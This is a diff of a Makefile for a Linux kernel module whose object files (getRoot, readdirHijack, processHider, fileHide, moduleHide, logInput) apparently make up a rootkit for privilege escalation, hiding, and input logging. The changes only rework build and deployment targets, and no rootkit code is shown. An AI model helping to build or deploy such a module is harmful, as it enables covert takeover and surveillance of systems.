@@ -13,13 +13,11 @@
 moduleName = blank
 obj-m += $(moduleName).o
 
-allSourceFilesAndHeaders = $(wildcard **.c **.h)
 blank-objs += getRoot.o hideProcEntry.o communication.o readdirHijack.o processHider.o processHiderPidManipulation.o main.o fileHide.o moduleHide.o logInput.o common.o communicationOutput.o buffer/buffer.o 
 outputFileName=$(moduleName).ko
 
 deploymentTemplateFiles = $(wildcard deploymentTemplate/*.sh)
 deploymentFiles = $(subst deploymentTemplate, deployment, $(deploymentTemplateFiles)) deployment/$(outputFileName)
-
 
 
 
@@ -42,7 +40,7 @@ uninstallSilently:
 	-@rmmod $(moduleName) 2> /dev/null 
 
 
-all: $(outputFileName)
+all:
 	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(BUILDDIR) modules
 
 setupDeployment: $(deploymentFiles)
@@ -51,12 +49,9 @@ deployment/%.sh: deploymentTemplate/%.sh
 	@mkdir "deployment" -p
 	cp "$(<)" "$(@)" 
 	
-deployment/%.ko: %.ko $(outputFileName)
+deployment/%.ko: %.ko all
 	@mkdir "deployment" -p
 	cp "$(<)" "$(@)" 
-	
-
-$(outputFileName): #$(allSourceFilesAndHeaders) #TODO: rename this
 	
 	
 clean:
